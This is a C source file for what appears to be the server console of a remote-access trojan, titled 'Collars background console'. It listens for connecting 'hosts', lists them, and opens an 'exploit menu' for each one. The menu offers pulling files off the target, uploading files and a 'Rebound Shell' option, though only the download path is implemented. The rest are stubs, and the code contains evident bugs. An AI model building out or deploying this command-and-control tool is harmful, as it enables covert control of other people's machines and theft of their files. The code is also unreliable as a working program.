#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include <semaphore.h>
#include <strings.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/wait.h>
#include <pthread.h>

#define PORT 8080

#define SUCCESS 0
#define DAMAGE -2
#define REFUSE -3
#define EXIST -4

static char localip[16];
static unsigned short localport;
static struct computer list_cmp;

pthread_mutex_t mu;
static int count=0;
static struct computer* array[100]={NULL};
static struct computer* new_computer_message=NULL;

struct computer
{   int sock;
    socklen_t sock_len;
    struct sockaddr_in sock_attr;
    
    char ip_c[16];
    unsigned short port_i;
}; 

void ppp(const char *title,int ret)
{   if(ret==-1)
    {   perror("title");
        abort();
    }
}

int ispipeblock(const char *title,int ret)
{   if(ret==-1 && errno==EPIPE)
        return 0;
    else if(ret ==-1)
    {   perror(title);
        abort();
    }
}

int ispipeend(const char *title,int ret)
{   if(ret==0)
        return 0;
    else if(ret ==-1)
    {   perror(title);
        abort();
    }
}

int f_download_tcp(struct computer *cmp,const char *filename)
{   
    int ret;
    ret=access(filename,F_OK);
    if(ret==0)
        goto up2;

    ssize_t f_size;
    ret=read(cmp->sock,&f_size,sizeof(f_size));
    if(!ispipeend("99",ret))    
        goto up1;

    char ch='n';
    char *f_mem=(char *)malloc(f_size);
    if(f_mem==NULL)
        ch='n';
    else
        ch='y';

    ret=write(cmp->sock,&ch,1);
    if(!ispipeblock("114",ret))
        goto up1;    

    ssize_t f_page=f_size/1024;
    ssize_t f_rest=f_size%1024;

    ssize_t recv_size=0;
    for(int i=0;i<f_page;i++)
    {   ret=read(cmp->sock,f_mem,1024);
        ispipeend("123",ret);
        
        recv_size+=ret;
        f_mem+=1024;
    }
    ret=read(cmp->sock,f_mem,f_rest);
    ispipeend("129",ret);
    recv_size+=ret;

    if(recv_size==f_size)
    {   int fd=open(filename,O_CREAT|O_TRUNC|O_RDWR,0666);
        ppp("177",fd);
        write(fd,f_mem,f_size);
        close(fd);
        return SUCCESS;
    }
    else
    {   printf("file damaged!\n");
        return DAMAGE;
    }
    
    up2:
    {   printf("file is exist\n");
        return EXIST;
    }

    up1:
        printf("target computer refuse\n");
    return REFUSE;
}

int f_sendto_tcp(struct computer *cmp,const char *filename)
{   
    int ret;
    int fd=open(filename,O_RDONLY);
    ppp("38",fd);

    ssize_t f_size=lseek(fd,0,SEEK_END);
    lseek(fd,0,SEEK_SET);

    char *f_mem=malloc(f_size);
    ret=read(fd,f_mem,f_size);

    close(fd);

    ssize_t f_page=f_size/1024;
    ssize_t f_rest=f_size%1024;

    printf("sendto file size...\n");
    write(cmp->sock,&f_size,sizeof(f_size));

    ret=0;
    printf("wait computer verify...\n");
    read(cmp->sock,&ret,1);

    printf("verify [%c]\n",*((char *)&ret));

    if( *((char *)&ret) =='y' )
    {   printf("verify successful \n");
        int sendto_size=0;
        printf("Sendto %s:%d toryfile size[%d]\n",cmp->ip_c,cmp->port_i,f_size);
        
        for(int i=0; i<f_page; i++)
        {   
            ret=write(cmp->sock,f_mem,1024);
            if(!ispipeblock("60",ret))
                goto up1;
            sendto_size+=ret;
            f_mem+=1024;
            puts("#");
        }
        ret=write(cmp->sock,f_mem,f_rest);
        if(!ispipeblock("66",ret))
                goto up1;
        sendto_size+=ret;
        puts("#");
        printf("%d %d\n",sendto_size,f_size);

        if(sendto_size==f_size)
        {   printf("Toryfile sendto successful!\n");
            return SUCCESS;
        }
        else
        {   printf("Toryfile damaged!\n");
            return DAMAGE;
        }
    }
    else
    {   up1:
        printf("Target computer is refuse!\n");
        return REFUSE;
    }
}

void Getlocaldata()
{   int ret;
    char file_name[512];
    char cmd_buf[1024];
    
    do{
    sleep(1);
    sprintf(file_name,"tempfile:%lld",time(NULL));
    }while(!access(file_name,F_OK));
    
    umask(00000);

    int fd=open(file_name,O_CREAT|O_RDWR,0666);
    ppp("62",fd);

    sprintf(cmd_buf,"ifconfig |grep 192 > %s",file_name);
    system(cmd_buf);

    bzero(cmd_buf,1024);
    ret=read(fd,cmd_buf,1024);
    ppp("71",ret);

    cmd_buf[ret]='\0';
    strtok(cmd_buf," ");
    strcpy(localip,strtok(NULL," "));
    
    localport=PORT;
    close(fd);
    unlink(file_name);
}

void cmp_init(struct computer *data,const char *ip,const short port)
{   
    bzero(data,sizeof(struct computer));
    data->sock_len=sizeof(struct sockaddr_in);
    
    data->sock=socket(AF_INET,SOCK_STREAM,0);
    // ppp("34",data->sock);

    data->sock_attr.sin_family=AF_INET;
    data->sock_attr.sin_port=htons(port);
    
    if(ip==NULL)
    {   data->sock_attr.sin_addr.s_addr=htonl(INADDR_ANY);
        inet_ntop(AF_INET,&data->sock_attr.sin_addr.s_addr,data->ip_c,16);
    }
    else
    {   data->sock_attr.sin_addr.s_addr=inet_addr(ip);
        strcpy(data->ip_c,ip);
    }

    data->port_i=port;
}
 
void cmp_init2(struct computer *data,int sock,struct sockaddr *temp)
{   bzero(data,sizeof(struct computer));

    data->sock=sock;
    data->sock_attr=(*(struct sockaddr_in *)temp);
    data->sock_len=sizeof(*temp);
    
    inet_ntop(AF_INET,&data->sock_attr.sin_addr.s_addr,data->ip_c,16);
    data->port_i=ntohs(data->sock_attr.sin_port);
}

void cmp_destory(struct computer *data)
{   
    close(data->sock);
}

void denypipe()
{   signal(SIGPIPE,SIG_IGN);

}

/*----------------------------------------------------------------------------------*/

void service_secure_int()
{   
    close(list_cmp.sock);
    for(int i=0; i<count; i++)
        close(array[i]->sock);

    exit(0);
}

void service_accept_target(short port)
{   int ret;

    cmp_init(&list_cmp,NULL,port);

    ret=bind(list_cmp.sock,(struct sockaddr *)&list_cmp.sock_attr,list_cmp.sock_len);
    ppp("177",ret);

    ret=listen(list_cmp.sock,100);
    ppp("180",ret);
    
    struct sockaddr temp;
    socklen_t temp_len=sizeof(temp);
    
    while(1)
    {   
        do
        {   ret=accept(list_cmp.sock,&temp,&temp_len);

        }while(ret==-1 && (errno==ECONNABORTED || errno==EINTR) );
        
        if(ret==-1 && errno==EADDRINUSE)
        {   puts("port is inuse");
            service_secure_int();
            exit(-1);
        }
        else if(ret==-1)
        {   perror("accept");
            service_secure_int();
            exit(-1);
        }

        new_computer_message=malloc(sizeof(struct computer));
        if(new_computer_message==NULL)
        ppp("340",-1);
                
        cmp_init2(new_computer_message,ret,&temp);

        pthread_mutex_lock(&mu);
        array[count++]=new_computer_message;
        pthread_mutex_unlock(&mu);
        
        // printf("localhost    [%s:%d]\n",list_cmp.ip_c,list_cmp.port_i);
        // printf("new computer [%s:%hu]\n",new_computer_message->ip_c,new_computer_message->port_i);
    }

    cmp_destory(&list_cmp);
}

void Service_showlist()
{   
    pthread_mutex_lock(&mu);
    if(count==0)
    {
        // printf("There is no connected host...\n");
    }
    else
    {   for(int i=0;i<count;i++)
            printf("[%d] ----> [ %s:%hu ]\n",i+1,array[i]->ip_c,array[i]->port_i);
    }
    printf("[%d] Refresh\n",count+1);
    pthread_mutex_unlock(&mu);
}

void* AC(void *data)
{   pthread_detach(pthread_self());
    service_accept_target(PORT);
}

void Service_AC()
{   pthread_t th;
    pthread_create(&th,NULL,AC,NULL);

}

void Service_download(int cur)
{   int ret;
    char filename[1024]={0};
    char screen[4096];
    write(array[cur]->sock,"3",1);

    system("clear");
    while(1)
    {   ret=read(array[cur]->sock,screen,4096);
        if(ret==1 && *screen=='y')
            break;

        screen[ret]='\0';
        fgets(filename,1024,stdin);
        write(array[cur]->sock,filename,strlen(filename));
    }

    f_download_tcp(array[cur],filename);
}

void Service_exploit_menu(int cur)
{   cur--;
    char action;
    
    while(1)
    {   up1:
        system("clear");
        printf("+----------------------------------+\n");
        printf("| Target_ip:   %-20s| \n",array[cur]->ip_c);
        printf("| Target_port: %-20hu| \n",array[cur]->port_i);
        printf("+----------------------------------+\n");
        printf("[1] Download the file \n");
        printf("[2] Upload the file \n");
        printf("[3] Rebound Shell]\n");
        printf("[4] Exit\n\n");
        
        printf("\nyour choice >>> ");
        fflush(stdout);

        action=getchar();
        while(getchar()!='\n');
        action=atoi(&action);

        if(action==0)
        {   puts(" ### Illegal Input! ### ");
            fflush(stdout);
            sleep(2);
            goto up1;
        }

        switch(action)
        {   case 1:
            {   Service_download(cur);
                break;
            }
            
            case 2:
            {   printf("case 2:");
                
                break;
            }
            case 3:
            {   printf("case 3:");
                break;
            }
            case 4:
                return;

            default:
                puts(" ### Illegal Input! ### ");
                fflush(stdout);
                sleep(2);
                goto up1;
        }
    }
}       

void Service()
{   Getlocaldata();
    Service_AC();
    signal(SIGINT,service_secure_int);
    
    char action;
    while(1)
    {   up1:
        system("clear");
        printf("Collars background console version 0\n");
        printf("+---------------------------------+\n");
        printf("| local_ip:   %-20s| \n",localip);
        printf("| local_port: %-20hu| \n",localport);
        printf("+---------------------------------+\n");
        printf("Online hosting total: [%d]\n\n",count);
        Service_showlist();
        
        
        printf("\nyour choice >>> ");
        fflush(stdout);

        action=getchar();
        while(getchar()!='\n');
        action=atoi(&action);

        //no have hosting
        if(count==0 && action!=count+1)
        {   puts(" ### Illegal Input! ### ");
            fflush(stdout);
            sleep(2);

            goto up1;
        }
        else if(count==0 && action==count+1)
            continue;

        //have hosting
        if( 0<action && action<=count+1)
        {   
            if(action==count+1)
                continue;   
            else
                Service_exploit_menu(action);
        }
        else
        {   puts("### Illegal Input! ###");
            sleep(2);
            goto up1;
        }
    }
}

int main()
{   pthread_mutex_init(&mu,NULL);

    Service();
    // Client();

    pthread_mutex_destroy(&mu);
}
